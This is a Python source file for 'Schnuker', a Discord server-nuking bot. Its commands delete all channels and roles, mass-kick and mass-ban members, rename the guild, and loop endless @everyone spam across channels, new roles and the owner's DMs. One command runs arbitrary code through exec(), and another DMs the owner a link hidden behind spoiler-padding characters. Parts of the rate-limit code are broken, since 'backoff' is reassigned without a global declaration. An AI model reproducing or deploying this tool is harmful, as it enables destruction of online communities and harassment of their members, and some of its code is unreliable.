import discord
import subprocess
import os
from discord.ext import commands
from colorama import Fore, init
import asyncio

os.system("title   S̸̝̽̂͝C̵̨̢͙̃Ȟ̶͎̎́Ń̵̙̒Ǔ̴̡̡ͅK̷̰͎̉E̷͉̞̋͂͘R̵̛̹̿͌  ^| 2.0")
init(autoreset=True)
global backoff
backoff = 1
global msgcount
msgcount = 0
global allow_commands
allow_commands = False

client = commands.Bot(command_prefix=[".", ">"], intents=discord.Intents.all())

async def call_logo():
    await client.change_presence(activity=discord.Game("with nukes"))
    print("\033c", end="", flush=True)
    init(autoreset=True)
    colors = [
        (135, 206, 250),
        (115, 186, 240),
        (95, 166, 230),
        (75, 146, 220),
        (55, 126, 210),
        (35, 106, 200)
    ]

    schnuker_logo = [
        " ██████╗ █████╗ ██╗  ██╗███╗  ██╗██╗   ██╗██╗  ██╗███████╗██████╗ ",
        "██╔════╝██╔══██╗██║  ██║████╗ ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗",
        "╚█████╗ ██║  ╚═╝███████║██╔██╗██║██║   ██║█████═╝ █████╗  ██████╔╝",
        " ╚═══██╗██║  ██╗██╔══██║██║╚████║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗",
        "██████╔╝╚█████╔╝██║  ██║██║ ╚███║╚██████╔╝██║ ╚██╗███████╗██║  ██║",
        "╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
    ]

    def color_text(text, rgb):
        return f"\033[38;2;{rgb[0]};{rgb[1]};{rgb[2]}m{text}\033[0m"

    for line, color in zip(schnuker_logo, colors):
        print(color_text(line, color))
    print(f"""
Logged in as {client.user}
Prefix: > or . | Commands: nuke, kickall (ka), massban (mb), spamchannels (sc), delchannels (dc), rolespam (rs), delroles (dr), ownerspam (osp), status, guildname (gn), restart, stop, spam, prefix (p), commands (cmds)""")

@client.event
async def on_ready():
    await call_logo()

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

async def delete_channel(channel):
    while True:
        try:
            await channel.delete()
            print(f"Console | Deleted #{channel}")
            break
        except (discord.Forbidden, discord.HTTPException) as e:
            if isinstance(e, discord.HTTPException) and e.status == 429:
                await asyncio.sleep(backoff)
                backoff = min(backoff * 2, 64)  # Exponential backoff
                print(f"Console | Rate limited, retrying in {backoff} seconds...")
            else:
                print(f"Console | Can't delete #{channel}: {e}")
                break

@client.command()
async def nuke(ctx, *, cn="schnuked"):
    global allow_commands
    allow_commands = True
    if allow_commands:
        await ctx.message.delete()
        await ctx.guild.edit(name="SCHNUKED! SCHOOI ON TOP")
        tasks = [delete_channel(channel) for channel in ctx.guild.channels]
        await asyncio.gather(*tasks)
        while True:
            await ctx.guild.create_text_channel(f"{cn}")
            print(f"Console | Successfully created a new channel named #{cn}")

@client.command()
async def delroles(ctx, *, role_name=""):
    await ctx.message.delete()
    roles = [role for role in ctx.guild.roles if not role_name or role.name == role_name]
    for role in roles:
        while True:
            try:
                await role.delete()
                print(f"Console | Successfully deleted the '{role.name}' role")
                break
            except (discord.Forbidden, discord.HTTPException) as e:
                if isinstance(e, discord.HTTPException) and e.status == 429:
                    await asyncio.sleep(backoff)
                    backoff = min(backoff * 2, 64)
                    print(f"Console | Rate limited, retrying in {backoff} seconds...")
                else:
                    print(f"Console | Error deleting role '{role.name}': {e}")
                    break

@client.command()
async def dr(ctx, *, role_name=""):
    await delroles(ctx, role_name=role_name)

@client.command()
async def exit(ctx):
    await ctx.message.delete()
    await client.close()

@client.command()
async def cmd(ctx, *, code='print("Console | Running cmd without the code value results in this message. Please input a code value.")'):
    await ctx.message.delete()
    if ctx.author.id == ctx.guild.owner.id:
        try:
            exec(code)
            print(f"Console | '{code}' executed successfully")
        except Exception as e:
            print(f"Console | Error executing {code}: {e}")
    else:
        await ctx.send("You do not have permission to execute this command.")

@client.command()
async def spam(ctx, *, text="Get Schnuked! @everyone"):
    await ctx.message.delete()
    global msgcount
    while True:
        for channel in ctx.guild.channels:
            while True:
                try:
                    await channel.send(text)
                    msgcount += 1
                    print(f"Console | Sent message in #{channel}, message count: {msgcount}")
                    break
                except (discord.Forbidden, discord.HTTPException) as e:
                    if isinstance(e, discord.HTTPException) and e.status == 429:
                        await asyncio.sleep(backoff)
                        backoff = min(backoff * 2, 64)
                        print(f"Console | Rate limited, retrying in {backoff} seconds...")
                    else:
                        print(f"Console | Error sending message in #{channel}: {e}")
                        break

@client.command()
async def spamchannels(ctx, *, channel_name="Schnuked"):
    global allow_commands
    allow_commands = False
    await ctx.message.delete()
    while True:
        while True:
            try:
                await ctx.guild.create_text_channel(channel_name)
                print(f"Console | Successfully created a new channel named #{channel_name}")
                break
            except (discord.Forbidden, discord.HTTPException) as e:
                if isinstance(e, discord.HTTPException) and e.status == 429:
                    await asyncio.sleep(backoff)
                    backoff = min(backoff * 2, 64)
                    print(f"Console | Rate limited, retrying in {backoff} seconds...")
                else:
                    print(f"Console | Error creating channel #{channel_name}: {e}")
                    break

@client.command()
async def sc(ctx, *, channel_name="Schnuked"):
    await spamchannels(ctx, channel_name=channel_name)

@client.command()
async def stopcmds(ctx):
    await ctx.message.delete()
    global allow_commands
    allow_commands = False
    await ctx.send("All commands are now stopped.")

@client.command()
async def stop(ctx):
    await ctx.message.delete()
    subprocess.Popen(["python", "Schnuker.py"])
    await client.close()

@client.command()
async def status(ctx, *, newstatus="with nukes"):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Game(newstatus))
    print(f"Console | Changed bot status to '{newstatus}'")

@client.command()
async def commands(ctx):
    await ctx.message.delete()
    owner = ctx.guild.owner
    await owner.send("Schnuker Commands :star:||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| https://embedl.ink/e/4VxIazGQ")

@client.command()
async def rolespam(ctx, *, role_name="Schnuked"):
    await ctx.message.delete()
    while True:
        while True:
            try:
                await ctx.guild.create_role(name=role_name)
                print(f"Console | Successfully created a new role named '{role_name}'")
                break
            except (discord.Forbidden, discord.HTTPException) as e:
                if isinstance(e, discord.HTTPException) and e.status == 429:
                    await asyncio.sleep(backoff)
                    backoff = min(backoff * 2, 64)
                    print(f"Console | Rate limited, retrying in {backoff} seconds...")
                else:
                    print(f"Console | Error creating role '{role_name}': {e}")
                    break

@client.command()
async def rs(ctx, *, role_name="Schnuked"):
    await rolespam(ctx, role_name=role_name)

@client.command()
async def kickall(ctx):
    await ctx.message.delete()
    members = [member for member in ctx.guild.members if member != ctx.guild.owner and member != ctx.author]
    for member in members:
        while True:
            try:
                await member.kick()
                print(f"Console | Kicked {member}")
                break
            except (discord.Forbidden, discord.HTTPException) as e:
                if isinstance(e, discord.HTTPException) and e.status == 429:
                    await asyncio.sleep(backoff)
                    backoff = min(backoff * 2, 64)
                    print(f"Console | Rate limited, retrying in {backoff} seconds...")
                else:
                    print(f"Console | Error kicking {member}: {e}")
                    break

@client.command()
async def ka(ctx):
    await kickall(ctx)

@client.command()
async def massban(ctx):
    await ctx.message.delete()
    members = [member for member in ctx.guild.members if member != ctx.guild.owner and member != ctx.author]
    for member in members:
        while True:
            try:
                await member.ban()
                print(f"Console | Banned {member}")
                break
            except (discord.Forbidden, discord.HTTPException) as e:
                if isinstance(e, discord.HTTPException) and e.status == 429:
                    await asyncio.sleep(backoff)
                    backoff = min(backoff * 2, 64)
                    print(f"Console | Rate limited, retrying in {backoff} seconds...")
                else:
                    print(f"Console | Error banning {member}: {e}")
                    break

@client.command()
async def mb(ctx):
    await massban(ctx)

@client.command()
async def delchannels(ctx, *, channel_name=""):
    await ctx.message.delete()
    tasks = [delete_channel(channel) for channel in ctx.guild.channels]
    await asyncio.gather(*tasks)

@client.command()
async def dc(ctx, *, channel_name=""):
    await delchannels(ctx, channel_name=channel_name)

@client.command()
async def guildname(ctx, *, name="SCHNUKED"):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)
    print(f"Console | Changed guild name to '{name}'")

@client.command()
async def gn(ctx, *, name="SCHNUKED"):
    await guildname(ctx, name=name)

@client.command()
async def ownerspam(ctx):
    await ctx.message.delete()
    owner = ctx.guild.owner
    while True:
        while True:
            try:
                await owner.send("Get Schnuked! @everyone")
                print("Console | Sent message to the server owner.")
                break
            except (discord.Forbidden, discord.HTTPException) as e:
                if isinstance(e, discord.HTTPException) and e.status == 429:
                    await asyncio.sleep(backoff)
                    backoff = min(backoff * 2, 64)
                    print(f"Console | Rate limited, retrying in {backoff} seconds...")
                else:
                    print(f"Console | Error sending message to the owner: {e}")
                    break

@client.command()
async def osp(ctx):
    await ownerspam(ctx)

@client.command()
async def prefix(ctx):
    await ctx.message.delete()
    await ctx.send("The current prefixes are: . and >")

@client.command()
async def cmds(ctx):
    await commands(ctx)

@client.command()
async def restart(ctx):
    clear_console()
    await ctx.message.delete()
    subprocess.Popen(["python", "Schnuker.py"])
    await client.close()

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("Command not found. Use >cmds to list all available commands.")
    else:
        raise error

@client.event
async def on_guild_channel_create(channel):
    global allow_commands
    if allow_commands:
        global msgcount
        while True:
            try:
                await channel.send("Get Schnuked! @everyone")
                msgcount += 1
                print(f"Console | Sent message in #{channel}, message count: {msgcount}")
                await asyncio.sleep(0.5)
            except (discord.Forbidden, discord.HTTPException) as e:
                if isinstance(e, discord.HTTPException) and e.status == 429:
                    await asyncio.sleep(backoff)
                    backoff = min(backoff * 2, 64)
                    print(f"Console | Rate limited, retrying in {backoff} seconds...")
                else:
                    print(f"Console | Error banning {member}: {e}")
                    break

if __name__ == "__main__":
    if os.path.exists('token.txt'):
        with open('token.txt', 'r') as file:
            content = file.read()
        if content:
            token = content
            client.run(token)
        else:
            token = input("Console | Please enter a discord bot token: ")
            with open('token.txt', 'w') as file:
                file.write(token)
            client.run(token)
    else:
        token = input("Console | Please enter a discord bot token: ")
        with open('token.txt', 'w') as file:
            file.write(token)
        client.run(token)